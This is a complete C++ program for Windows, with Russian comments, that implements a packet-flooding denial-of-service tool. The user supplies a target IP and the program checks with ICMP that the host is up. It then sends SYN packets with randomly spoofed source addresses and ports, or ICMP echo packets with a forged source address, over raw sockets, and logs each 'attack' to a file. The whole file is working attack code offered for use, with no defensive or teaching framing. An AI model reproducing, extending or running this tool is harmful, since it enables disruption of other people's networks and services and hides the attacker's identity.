#define _WIN32_WINNT 0x0601
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <chrono>
#include <thread>
#include <random>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")

// Логирование
void Log(const std::string& message) {
    try {
        std::ofstream logFile("attack_log.txt", std::ios::app);
        if (!logFile.is_open()) {
            throw std::runtime_error("Failed to open log file");
        }

        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        logFile << std::ctime(&time) << " - " << message << std::endl << std::endl;
    }
    catch (...) {
        std::cerr << "FATAL: Failed to write to log file" << std::endl;
        throw;
    }
}

// Структуры заголовков
struct IPV4_HDR {
    BYTE ver_ihl;
    BYTE tos;
    USHORT total_length;
    USHORT ident;
    USHORT flags_fo;
    BYTE ttl;
    BYTE protocol;
    USHORT checksum;
    ULONG src_addr;
    ULONG dest_addr;
};

struct TCP_HDR {
    USHORT src_port;
    USHORT dst_port;
    ULONG seq_num;
    ULONG ack_num;
    BYTE data_off;
    BYTE flags;
    USHORT window;
    USHORT checksum;
    USHORT urg_ptr;
};

struct ICMP_HDR {
    BYTE type;
    BYTE code;
    USHORT checksum;
    USHORT id;
    USHORT seq;
};

#define TH_SYN 0x02

// Контрольная сумма
USHORT checksum(USHORT* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) cksum += *(UCHAR*)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

// Проверка доступности хоста
bool is_alive(const char* ip) {
    HANDLE hIcmp = IcmpCreateFile();
    if (hIcmp == INVALID_HANDLE_VALUE) {
        Log("IcmpCreateFile failed");
        return false;
    }

    char sendData[32] = "Test";
    DWORD replySize = sizeof(ICMP_ECHO_REPLY) + sizeof(sendData) + 8;
    std::unique_ptr<char[]> replyBuffer(new char[replySize]);

    IPAddr destination;
    if (InetPtonA(AF_INET, ip, &destination) <= 0) {
        Log("Invalid IP address format");
        IcmpCloseHandle(hIcmp);
        return false;
    }

    DWORD ret = IcmpSendEcho2(
        hIcmp,
        NULL,
        NULL,
        NULL,
        destination,
        sendData,
        sizeof(sendData),
        NULL,
        replyBuffer.get(),
        replySize,
        1000
    );

    IcmpCloseHandle(hIcmp);

    if (ret == 0) {
        Log("ICMP request failed");
        return false;
    }

    PICMP_ECHO_REPLY echoReply = (PICMP_ECHO_REPLY)replyBuffer.get();
    if (echoReply->Status != IP_SUCCESS) {
        Log("ICMP status: " + std::to_string(echoReply->Status));
        return false;
    }

    return true;
}

// SYN-flood
void syn_flood(const char* target_ip, int port, int count, int delay) {
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        throw std::runtime_error("Failed to create socket: " + std::to_string(WSAGetLastError()));
    }

    char packet[sizeof(IPV4_HDR) + sizeof(TCP_HDR)] = { 0 };
    IPV4_HDR* iph = (IPV4_HDR*)packet;
    TCP_HDR* tcph = (TCP_HDR*)(packet + sizeof(IPV4_HDR));

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(1024, 65535);

    sockaddr_in dest_addr{};
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    InetPtonA(AF_INET, target_ip, &dest_addr.sin_addr);

    try {
        for (int i = 0; i < count; ++i) {
            // IP-заголовок
            iph->ver_ihl = 0x45;
            iph->tos = 0;
            iph->total_length = htons(sizeof(packet));
            iph->ident = htons(dist(gen));
            iph->flags_fo = 0;
            iph->ttl = 128;
            iph->protocol = IPPROTO_TCP;
            iph->src_addr = htonl(dist(gen));
            iph->dest_addr = dest_addr.sin_addr.s_addr;
            iph->checksum = checksum((USHORT*)iph, sizeof(IPV4_HDR));

            // TCP-заголовок
            tcph->src_port = htons(dist(gen));
            tcph->dst_port = htons(port);
            tcph->seq_num = htonl(dist(gen));
            tcph->ack_num = 0;
            tcph->data_off = (5 << 4);
            tcph->flags = TH_SYN;
            tcph->window = htons(65535);
            tcph->checksum = checksum((USHORT*)tcph, sizeof(TCP_HDR));
            tcph->urg_ptr = 0;

            if (sendto(s, packet, sizeof(packet), 0, (sockaddr*)&dest_addr, sizeof(dest_addr)) == SOCKET_ERROR) {
                throw std::runtime_error("sendto failed: " + std::to_string(WSAGetLastError()));
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(delay));
        }
    }
    catch (...) {
        closesocket(s);
        throw;
    }

    closesocket(s);
}

// ICMP-flood
void icmp_flood(const char* target_ip, int count, int delay) {
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == INVALID_SOCKET) {
        throw std::runtime_error("Failed to create socket: " + std::to_string(WSAGetLastError()));
    }

    char packet[sizeof(IPV4_HDR) + sizeof(ICMP_HDR)] = { 0 };
    IPV4_HDR* iph = (IPV4_HDR*)packet;
    ICMP_HDR* icmph = (ICMP_HDR*)(packet + sizeof(IPV4_HDR));

    sockaddr_in dest_addr{};
    dest_addr.sin_family = AF_INET;
    InetPtonA(AF_INET, target_ip, &dest_addr.sin_addr);

    try {
        for (int i = 0; i < count; ++i) {
            // IP-заголовок
            iph->ver_ihl = 0x45;
            iph->tos = 0;
            iph->total_length = htons(sizeof(packet));
            iph->ident = htons(1);
            iph->flags_fo = 0;
            iph->ttl = 128;
            iph->protocol = IPPROTO_ICMP;
            iph->src_addr = htonl(0x01010101);
            iph->dest_addr = dest_addr.sin_addr.s_addr;
            iph->checksum = checksum((USHORT*)iph, sizeof(IPV4_HDR));

            // ICMP-заголовок
            icmph->type = 8;
            icmph->code = 0;
            icmph->id = 1;
            icmph->seq = i;
            icmph->checksum = checksum((USHORT*)icmph, sizeof(ICMP_HDR));

            if (sendto(s, packet, sizeof(packet), 0, (sockaddr*)&dest_addr, sizeof(dest_addr)) == SOCKET_ERROR) {
                throw std::runtime_error("sendto failed: " + std::to_string(WSAGetLastError()));
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(delay));
        }
    }
    catch (...) {
        closesocket(s);
        throw;
    }

    closesocket(s);
}

int main() {
    try {
        // Инициализация Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error("WSAStartup failed");
        }
        Log("WSAStartup initialized successfully");

        // Ввод данных
        std::string target_ip;
        std::cout << "Enter target IP: ";
        std::cin >> target_ip;

        if (!is_alive(target_ip.c_str())) {
            throw std::runtime_error("Target is not alive or not responding to ICMP");
        }
        Log("Target " + target_ip + " is alive");

        int attack_type, count, delay, port = 80;
        std::cout << "Choose attack type (1 - SYN, 2 - ICMP): ";
        std::cin >> attack_type;
        std::cout << "Enter packet count: ";
        std::cin >> count;
        std::cout << "Enter delay (ms): ";
        std::cin >> delay;

        if (attack_type == 1) {
            std::cout << "Enter target port: ";
            std::cin >> port;
            if (port < 1 || port > 65535) {
                throw std::invalid_argument("Invalid port number");
            }
            Log("Starting SYN flood attack on " + target_ip + ":" + std::to_string(port));
            syn_flood(target_ip.c_str(), port, count, delay);
        }
        else if (attack_type == 2) {
            Log("Starting ICMP flood attack on " + target_ip);
            icmp_flood(target_ip.c_str(), count, delay);
        }
        else {
            throw std::invalid_argument("Invalid attack type selected");
        }

        Log("Attack completed successfully");
        std::cout << "Attack completed. Check attack_log.txt for details" << std::endl;

    }
    catch (const std::exception& e) {
        Log("EXCEPTION: " + std::string(e.what()));
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    catch (...) {
        Log("UNKNOWN EXCEPTION OCCURRED");
        std::cerr << "Unknown error occurred" << std::endl;
        return 1;
    }

    WSACleanup();
    return 0;
}
